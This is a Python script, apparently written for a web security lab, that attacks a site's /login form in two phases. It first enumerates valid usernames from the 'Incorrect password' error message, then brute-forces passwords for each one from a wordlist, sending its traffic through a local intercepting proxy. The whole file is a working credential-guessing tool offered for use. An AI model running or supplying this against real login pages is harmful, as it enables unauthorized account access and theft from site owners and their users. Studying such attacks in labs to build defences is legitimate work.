import requests
import sys
import urllib3
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

if len(sys.argv) < 5:
    print(f"Usage:\npython3 {sys.argv[0]} <users_file> <passwords_file> <URL> <session_cookie>")
    sys.exit(1)

USERS_FILE = sys.argv[1]
PASS_FILE = sys.argv[2]
TARGET_URL = sys.argv[3].rstrip('/')
SESSION_ID = sys.argv[4]

session = requests.Session()
session.cookies.set("session", SESSION_ID)
session.proxies = PROXIES
session.verify = False

def send_request(username, password):
    url = f"{TARGET_URL}/login"
    data = {"username": username, "password": password}
    return session.post(url, data=data, allow_redirects=False)

def is_username(username):
    response = send_request(username, "check_valid_user_logic")
    return "Incorrect password" in response.text

def enumerate_users():
    print(f"[*] Phase 1: Starting username enumeration...")
    
    if not os.path.isfile(USERS_FILE):
        print(f"[-] Error: {USERS_FILE} not found.")
        sys.exit(1)

    valid_usernames = []
    with open(USERS_FILE, "r") as us:
        for line in us:
            username = line.strip()
            if not username: continue
            
            if is_username(username):
                print(f"[+] Found valid username: {username}")
                valid_usernames.append(username)
    
    return valid_usernames

def password_brute():
    usernames = enumerate_users()
    
    if not usernames:
        print("[-] No valid usernames identified.")
        sys.exit(1)

    print(f"[*] Phase 2: Starting password attack on {len(usernames)} user(s)...")

    if not os.path.isfile(PASS_FILE):
        print(f"[-] Error: {PASS_FILE} not found.")
        sys.exit(1)

    with open(PASS_FILE, "r") as pa:
        passwords = [p.strip() for p in pa if p.strip()]

    for username in usernames:
        print(f"[*] Attacking user: {username}")
        for password in passwords:
            sys.stdout.write(f"\r    [>] Trying: {password:<20}")
            sys.stdout.flush()

            response = send_request(username, password)

            if response.status_code == 302 or ("Incorrect password" not in response.text and "Invalid username" not in response.text):
                print(f"\n[!] SUCCESS: Username: {username} | Password: {password}")
                return 

    print("\n[-] Attack finished. No credentials found.")

if __name__ == "__main__":
    password_brute()